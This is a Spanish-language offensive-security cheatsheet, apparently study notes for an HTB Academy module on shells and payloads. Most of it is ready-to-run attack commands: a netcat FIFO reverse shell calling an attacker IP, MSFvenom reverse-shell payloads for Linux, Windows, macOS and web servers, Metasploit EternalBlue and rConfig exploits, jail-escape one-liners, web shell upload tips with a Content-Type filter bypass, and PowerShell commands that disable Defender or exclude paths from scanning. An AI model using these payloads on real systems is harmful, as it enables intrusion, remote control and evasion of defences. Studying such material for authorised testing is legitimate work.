# Shells & Payloads — Cheatsheet

> 📋 Cheatsheet de referencia (comandos, tablas, metodología) — **no** es un writeup de laboratorio con capturas. Para los writeups con capturas de Skills Assessments resueltos, ver `$ ls modulos/` en el README principal.

## Contenido

- [Shells & Payloads — Índice, cheatsheet y metodología](#shells--payloads--índice-cheatsheet-y-metodología)
- [Conceptos básicos (Shell Basics)](#conceptos-básicos-shell-basics)
- [Shells de enlace (Bind) y Reverse](#shells-de-enlace-bind-y-reverse)
- [Payloads](#payloads)
- [Elaboración de payloads con MSFvenom](#elaboración-de-payloads-con-msfvenom)
- [Unix / NIX Shells](#unix--nix-shells)
- [Web Shells](#web-shells)

---

## Shells & Payloads — Índice, cheatsheet y metodología

Nota índice del módulo: enlaces a todas las notas, la **metodología** para conseguir una shell y la **cheatsheet** completa.

---

### Índice de notas

- **Conceptos** → **Conceptos básicos (Shell Basics)** · **Shells de enlace (Bind Shells)** · **Payloads**
- **Generar payloads** → **Elaboración de payloads con MSFvenom**
- **Por objetivo** → **Infiltrando Windows** · **Unix Shells** · **Web Shells**

---

### Metodología — cómo conseguir una shell

1. **Enumerar** el objetivo (banner grabbing, servicios) → decidir si es **Windows**, **Linux** o **web**.
2. **Elegir el tipo de shell**: **reverse** (la víctima conecta hacia ti — casi siempre) vs **bind** (tú conectas a la víctima).
3. **Iniciar el listener** en tu máquina: `sudo nc -lvnp <port>` (o `multi/handler` para meterpreter).
4. **Conseguir ejecución** en el objetivo con un payload:
   - One-liner (`bash`/`powershell`/php…), o
   - Binario/web con **MSFvenom** (`.elf`/`.exe`/`.asp`/`.jsp`/`.war`), o
   - **Exploit** de Metasploit (psexec, EternalBlue…).
5. **Transferir y ejecutar** el payload → ver módulo **File Transfers**.
6. **Recibir la shell** → **estabilizar la TTY** (`script /dev/null -c /bin/bash` → `Ctrl+Z` → `stty raw -echo; fg`).
7. **Enumerar para escalar** privilegios (`sudo -l`, `ls -la`, versión del SO, vulns).

> [!TIP]
> **Reverse casi siempre**
> El tráfico **saliente** del objetivo suele estar menos filtrado que el entrante, por eso la **reverse shell** es la opción por defecto. Usa el puerto **443** (parece HTTPS y pasa firewalls).

---

### Cheatsheet

#### Conexión y descubrimiento

| Comando | Qué hace |
|---------|----------|
| `xfreerdp /v:<IP> /u:<user> /p:<pass>` | Conectar a Windows por RDP |
| `env` / `ps` | Descubrir/validar el shell en uso |

#### Listeners y shells básicas

| Comando                                                                                   | Qué hace                           |
| ----------------------------------------------------------------------------------------- | ---------------------------------- |
| `sudo nc -lvnp <port>`                                                                    | Iniciar listener de netcat         |
| `nc -nv <IP> <port>`                                                                      | Conectar a un listener             |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc <IP> <port> > /tmp/f` | Reverse/bind shell (netcat + FIFO) |
| revshells.com                                                                             | Generar one-liners de shell        |

#### Reverse shell de PowerShell

`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',443); ... "` → ver **Infiltrando Windows**.

#### MSFvenom

| Formato | Comando |
|---------|---------|
| Linux | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > f.elf` |
| Windows | `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > f.exe` |
| macOS | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=443 -f macho > f.macho` |
| ASP | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f asp > f.asp` |
| JSP / WAR | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=443 -f raw > f.jsp` / `-f war > f.war` |

#### Metasploit

| Comando                                                       | Qué hace                                  |
| ------------------------------------------------------------- | ----------------------------------------- |
| `use auxiliary/scanner/smb/smb_ms17_010`                      | Comprobar EternalBlue                     |
| `use exploit/windows/smb/ms17_010_psexec`                     | Explotar EternalBlue                      |
| `use exploit/windows/smb/psexec`                              | Shell vía SMB + psexec (con creds)        |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` | RCE en rConfig 3.9.6 (Linux)              |
| `shell`                                                       | (en meterpreter) caer a shell del sistema |

#### Spawn de shell interactiva (NIX)

| Método | Comando |
|--------|---------|
| Python | `python -c 'import pty; pty.spawn("/bin/sh")'` |
| sh/perl/ruby/lua/awk | `/bin/sh -i` · `perl -e 'exec "/bin/sh";'` · `awk 'BEGIN {system("/bin/sh")}'` |
| find / vim | `find . -exec /bin/sh \; -quit` · `vim -c ':!/bin/sh'` (jail escape) |
| Estabilizar TTY | `script /dev/null -c /bin/bash` → `Ctrl+Z` → `stty raw -echo; fg` |
| Privesc rápido | `sudo -l` · `ls -la <ruta>` |

#### Web shells

| Recurso | Ruta |
|---------|------|
| Laudanum | `/usr/share/laudanum` (asp/aspx/jsp/php) |
| Antak (Nishang) | `/usr/share/nishang/Antak-WebShell` |
| wwwolf (PHP) | github WhiteWinterWolf/wwwolf-php-webshell |

#### Evasión básica

| Comando                                             | Qué hace                                            |
| --------------------------------------------------- | --------------------------------------------------- |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Desactivar Defender (real-time) — ruidoso           |
| `Add-MpPreference -ExclusionPath "C:\Users\Public"` | Excluir una ruta del escaneo de Defender — sigiloso |

---

## Conceptos básicos (Shell Basics)

Todo sistema operativo tiene un **shell**; para interactuar con él usamos una aplicación llamada **emulador de terminal** (*terminal emulator*).

### Emuladores de terminal

| Emulador | Sistema operativo |
|----------|-------------------|
| [Windows Terminal](https://github.com/microsoft/terminal) | Windows |
| [cmder](https://cmder.app/) | Windows |
| [PuTTY](https://www.putty.org/) | Windows |
| [kitty](https://sw.kovidgoyal.net/kitty/) | Windows, Linux, macOS |
| [Alacritty](https://github.com/alacritty/alacritty) | Windows, Linux, macOS |
| [xterm](https://invisible-island.net/xterm/) | Linux |
| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux |
| [Konsole](https://konsole.kde.org/) | Linux |
| [Terminal](https://en.wikipedia.org/wiki/Terminal_(macOS)) / [iTerm2](https://iterm2.com/) | macOS |

---

### Conectar al objetivo

```bash
xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!
```
Cliente de línea de comandos para conectar a un **objetivo Windows por RDP**.

---

### Validar / descubrir el shell

Al aterrizar en una shell, lo primero es saber **qué shell** es (bash, sh, PowerShell…).

```bash
env
```
Muestra las **variables de entorno**. Funciona con muchos intérpretes y es una buena forma de descubrir **qué lenguaje de shell** está en uso (mira `SHELL`).

```bash
ps
```
Valida el shell mirando el **proceso** actual.

> [!TIP]
> `env` y `ps` son el reflejo automático nada más obtener acceso: te dicen dónde estás (usuario, shell, PATH) antes de decidir el siguiente paso.

---

### Resumen rápido (cheatsheet)

| Comando | Qué hace |
|---------|----------|
| `xfreerdp /v:<IP> /u:<user> /p:<pass>` | Conectar a un Windows por RDP |
| `env` | Ver variables de entorno / descubrir el shell |
| `ps` | Validar el shell por su proceso |

---

Relacionado: **Shells de enlace (Bind Shells)** · **Payloads** · **Infiltrando Windows** · **0 - Shells & Payloads (Índice y cheatsheet)**

---

## Shells de enlace (Bind) y Reverse

Para controlar un sistema remoto desde el emulador de terminal de tu máquina de ataque se usan dos modelos:

- **Bind shell**: el **objetivo escucha** en un puerto y tú te **conectas** a él. Problema: suele bloquearlo el firewall entrante del objetivo.
- **Reverse shell**: el **objetivo se conecta de vuelta** hacia ti (que escuchas). Es la más habitual, porque el tráfico saliente suele estar menos filtrado.

> [!TIP]
> **Comparativa visual (añadido)**
> ```mermaid
> flowchart LR
>     subgraph Bind["Bind shell"]
>         direction LR
>         V1["Víctima<br/>escucha (nc -l)"] -->|"atacante se conecta"| A1["Atacante<br/>nc -nv IP puerto"]
>     end
>     subgraph Reverse["Reverse shell (habitual)"]
>         direction LR
>         A2["Atacante<br/>escucha (nc -lvnp)"] <-->|"víctima conecta hacia fuera"| V2["Víctima<br/>nc IP puerto"]
>     end
> ```

---

### Práctica con Netcat (bind shell)

**1. Servidor — el objetivo inicia el listener:**
```bash
nc -lvnp 7777
```
`-l` escucha · `-v` verbose · `-n` sin DNS · `-p` puerto.

**2. Cliente — la máquina de ataque se conecta:**
```bash
nc -nv 10.129.41.200 7777
```

> [!NOTE]
> En una **bind shell real** el listener del objetivo sirve un shell (`/bin/bash`), no solo un chat. Ver el one-liner con FIFO en **Payloads**.

---

### Generador de reverse/bind shells

**revshells.com** → <https://www.revshells.com/>

Genera one-liners de reverse/bind shell en decenas de lenguajes (bash, python, powershell, php, nc…) rellenando IP y puerto. Ahorra memorizar la sintaxis exacta.

---

### Resumen rápido (cheatsheet)

| Comando | Qué hace |
|---------|----------|
| `nc -lvnp <port>` | Iniciar un listener (atacante o víctima según el modelo) |
| `nc -nv <IP> <port>` | Conectar a un listener |
| revshells.com | Generar one-liners de reverse/bind shell |

---

Relacionado: **Payloads** · **Unix Shells** · **Conceptos básicos (Shell Basics)** · **0 - Shells & Payloads (Índice y cheatsheet)**

---

## Payloads

Un **payload** es el comando o código que **explota una vulnerabilidad** en un SO o aplicación y realiza la acción maliciosa. Desde el lado defensivo, es lo que detectan los antivirus (ej. Windows Defender detiene un reverse shell de PowerShell por considerarlo código malicioso).

---

### One-liner de shell diseccionado

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

Trozo a trozo:

| Parte | Qué hace |
|-------|----------|
| `rm -f /tmp/f;` | Elimina `/tmp/f` si existe (`-f` ignora si no existe). El `;` ejecuta secuencialmente. |
| `mkfifo /tmp/f;` | Crea una **tubería con nombre (FIFO)** en `/tmp/f`. |
| `cat /tmp/f \|` | Concatena el FIFO; la tubería `\|` conecta su *stdout* a la entrada del siguiente comando. |
| `/bin/bash -i 2>&1 \|` | Lanza bash **interactivo** (`-i`); `2>&1` redirige *stderr* a *stdout* para que ambos vayan a la tubería. |
| `nc 10.10.14.12 7777 > /tmp/f` | Abre conexión con **netcat** y devuelve la salida al FIFO, cerrando el bucle. |

> [!NOTE]
> **Bind vs reverse**
> Con `nc <IP_atacante> <puerto>` (como arriba) es una **reverse shell** (la víctima conecta hacia ti). Con `nc -l <IP> <puerto>` sería una **bind shell** (la víctima escucha y tú conectas). Ver **Shells de enlace (Bind Shells)**.

> [!TIP]
> **Flujo del one-liner (añadido)**
> El FIFO (`/tmp/f`) es lo que conecta la salida de `nc` de vuelta a la entrada de `bash`, cerrando el bucle sin un fichero temporal real en disco:
>
> ```mermaid
> flowchart LR
>     A["nc IP puerto<br/>(datos del atacante)"] -->|"escribe en"| F["/tmp/f (FIFO)"]
>     F -->|"cat lee"| B["bash -i<br/>(ejecuta el comando)"]
>     B -->|"stdout + stderr (2&gt;&amp;1)"| A
> ```

---

### Estabilizar / mejorar la TTY

Una shell de netcat es "tonta" (sin autocompletado, Ctrl+C la mata). Para convertirla en una **TTY completa**:

```bash
script /dev/null -c /bin/bash    # 1. en la shell de la víctima
# 2. Ctrl+Z (suspende la sesión)
stty raw -echo; fg               # 3. en TU terminal
reset                            # 4. si la pantalla queda rara
export TERM=xterm SHELL=/bin/bash  # 5. exporta terminal y shell
```

> [!TIP]
> Con la TTY estabilizada ganas `Ctrl+C` sin morir, historial, autocompletado y editores interactivos (`vim`, `nano`). Es de las primeras cosas que se hacen tras coger un reverse shell.

---

### Resumen rápido (cheatsheet)

| Comando | Qué hace |
|---------|----------|
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc <IP> <port> > /tmp/f` | Reverse/bind shell con netcat + FIFO |
| `script /dev/null -c /bin/bash` → `Ctrl+Z` → `stty raw -echo; fg` | Estabilizar la TTY |
| `export TERM=xterm SHELL=/bin/bash` | Terminal completa |

---

Relacionado: **Shells de enlace (Bind Shells)** · **Unix Shells** · **Elaboración de payloads con MSFvenom** · **Infiltrando Windows** · **0 - Shells & Payloads (Índice y cheatsheet)**

---

## Elaboración de payloads con MSFvenom

**MSFvenom** genera payloads (reverse/bind shells, meterpreter…) en múltiples plataformas y formatos.

```bash
msfvenom -l payloads      # listar todos los payloads disponibles
msfvenom -p <payload> --list-options   # opciones de un payload
```

> [!NOTE]
> **Anatomía del comando**
> `-p <payload>` · `LHOST=` tu IP · `LPORT=` tu puerto · `-f <formato>` el formato de salida · `> fichero`. Los payloads `*_reverse_tcp` sin `meterpreter` son **stageless** (sin fases): todo el código va en el propio fichero.

---

### Payloads por plataforma / formato

| Objetivo | Comando |
|----------|---------|
| **Linux** (ELF) | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > shell.elf` |
| **Windows** (EXE) | `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > shell.exe` |
| **macOS** (Mach-O) | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > shell.macho` |
| **Web ASP** (meterpreter) | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > shell.asp` |
| **Web JSP** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > shell.jsp` |
| **Web WAR** (Java/JSP) | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > shell.war` |

> [!TIP]
> Elige el **formato según dónde vas a ejecutarlo**: `.elf`/`.exe`/`.macho` para binarios en el SO; `.asp`/`.jsp`/`.war` para subir a un servidor web vulnerable (ver **Web Shells**).

---

### Recibir la conexión (listener)

```bash
sudo nc -lvnp 443
```
Para un payload `shell_reverse_tcp` (stageless) basta un `nc`. Para **meterpreter** necesitas el `multi/handler` de Metasploit con el mismo payload, LHOST y LPORT.

---

### Resumen rápido (cheatsheet)

| Formato | Comando |
|---------|---------|
| Linux | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<p> -f elf > f.elf` |
| Windows | `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<p> -f exe > f.exe` |
| macOS | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<p> -f macho > f.macho` |
| ASP / JSP / WAR | `-p windows/meterpreter/reverse_tcp -f asp` · `-p java/jsp_shell_reverse_tcp -f raw`/`-f war` |
| Listar | `msfvenom -l payloads` |
| Recibir | `sudo nc -lvnp 443` (o `multi/handler` para meterpreter) |

---

Relacionado: **Payloads** · **Web Shells** · **Infiltrando Windows** · **0 - Shells & Payloads (Índice y cheatsheet)** · **0 - Metasploit (Índice y cheatsheet)**

---

## Unix / NIX Shells

Formas de **lanzar un shell interactivo** en Linux/Unix desde distintos binarios/lenguajes. Útil para mejorar shells "tontas" y para **escapar de jail-shells** o de binarios con permisos.

---

### Lanzar un shell interactivo

| Método | Comando |
|--------|---------|
| **sh directo** | `/bin/sh -i` |
| **Python** (pty) | `python -c 'import pty; pty.spawn("/bin/sh")'` |
| **Perl** | `perl -e 'exec "/bin/sh";'` |
| **Ruby** | `ruby -e 'exec "/bin/sh"'` |
| **Lua** | `lua -e 'os.execute("/bin/sh")'` |
| **AWK** | `awk 'BEGIN {system("/bin/sh")}'` |

> [!NOTE]
> `python -c 'import pty; pty.spawn("/bin/sh")'` es el más usado para pasar de una shell de netcat a una **interactiva**; complétalo con la estabilización de TTY (ver **Payloads**).

---

### Find como lanzador de shell

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
Busca un fichero y, al encontrarlo, ejecuta `awk` con el script que lanza `/bin/sh`.

```bash
find . -exec /bin/sh \; -quit
```
Usa `-exec` para lanzar el shell directamente (si `find` no encuentra nada, no hay shell).

---

### VIM como lanzador de shell (escape de jail-shells)

```
vim -c ':!/bin/sh'
```
```
vim
:set shell=/bin/sh
:shell
```
Muy útil para **escapar de "jail-shells"** restringidas.

---

### Consideraciones de permisos (hacia privesc)

```bash
ls -la <ruta/al/fichero_o_binario>
```
Lista permisos: busca **binarios que puedas ejecutar** o SUID interesantes.

```bash
sudo -l
```
Muestra qué comandos puede ejecutar la cuenta actual **como `sudo`**. Ejemplo real de salida:
```
User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

> [!TIP]
> `sudo -l` con `(ALL : ALL) NOPASSWD: ALL` = puedes ejecutar cualquier cosa como root sin contraseña → `sudo su` y eres root. Es de lo primero que se comprueba al aterrizar en Linux.

---

### Resumen rápido (cheatsheet)

| Método | Comando |
|--------|---------|
| Python (pty) | `python -c 'import pty; pty.spawn("/bin/sh")'` |
| sh / perl / ruby / lua / awk | `/bin/sh -i` · `perl -e 'exec "/bin/sh";'` · `ruby -e 'exec "/bin/sh"'` · `lua -e 'os.execute("/bin/sh")'` · `awk 'BEGIN {system("/bin/sh")}'` |
| find | `find . -exec /bin/sh \; -quit` |
| vim (jail escape) | `vim -c ':!/bin/sh'` |
| Permisos / privesc | `ls -la <ruta>` · `sudo -l` |

---

Relacionado: **Payloads** · **Shells de enlace (Bind Shells)** · **Web Shells** · **0 - Shells & Payloads (Índice y cheatsheet)**

---

## Web Shells

Una **web shell** es un script (PHP, ASPX, JSP…) que subes a un servidor web vulnerable y que te da **ejecución de comandos** a través del navegador. En Parrot/Pwnbox ya vienen varias colecciones instaladas.

---

### Laudanum

```bash
/usr/share/webshells/laudanum
```
Repositorio con web shells **inyectables** para muchos lenguajes (`asp`, `aspx`, `jsp`, `php`). Copia la que necesites a tu directorio de trabajo:

```bash
cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

> [!NOTE]
> **Ruta exacta (añadido)**
> La cheatsheet oficial de HTB confirma la ruta completa como `/usr/share/webshells/laudanum` (no solo `/usr/share/laudanum`).

> [!WARNING]
> En las web shells de Laudanum suele haber que **editar el fichero** para permitir tu IP (lista de IPs autorizadas) antes de subirlo.

---

### Antak Webshell (Nishang)

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx .
```
Web shell **ASPX** de Nishang (basada en PowerShell). Hay que **modificar la línea 14** (credenciales/config) antes de usarla. Referencia de vídeos: <https://ippsec.rocks/#>.

> [!NOTE]
> Con esta app los ficheros subidos se guardan en el directorio `\files\`. Al navegar a `upload.aspx` verás la petición de subida.

---

### Web shell en PHP (wwwolf)

<https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php>

Web shell en PHP sencilla y funcional. Si el servidor filtra por tipo, puedes **cambiar el `Content-Type`** de la petición de subida en **Burp Suite** para saltarte el filtro.

---

### Ubicación de web shells (Parrot / Pwnbox)

| Colección | Ruta |
|-----------|------|
| Laudanum | `/usr/share/webshells/laudanum` · `/usr/share/laudanum` |
| Antak (Nishang) | `/usr/share/nishang/Antak-WebShell` |

> [!TIP]
> Elige el lenguaje de la web shell **según la tecnología del servidor** (PHP → `.php`, IIS/.NET → `.aspx`, Tomcat → `.jsp`/`.war`). Genera `.asp`/`.jsp`/`.war` también con MSFvenom (ver **Elaboración de payloads con MSFvenom**).

---

### Resumen rápido (cheatsheet)

| Web shell | Comando / Ruta |
|-----------|----------------|
| Laudanum | `cp /usr/share/webshells/laudanum/aspx/shell.aspx ./demo.aspx` (editar IP permitida) |
| Antak (Nishang) | `cp /usr/share/nishang/Antak-WebShell/antak.aspx .` (editar línea 14) |
| wwwolf (PHP) | github WhiteWinterWolf/wwwolf-php-webshell |
| Localización | `/usr/share/webshells/laudanum` · `/usr/share/nishang/Antak-WebShell` |

---

Relacionado: **Elaboración de payloads con MSFvenom** · **Unix Shells** · **0 - File Transfers (Índice y guía)** · **0 - Shells & Payloads (Índice y cheatsheet)**

---
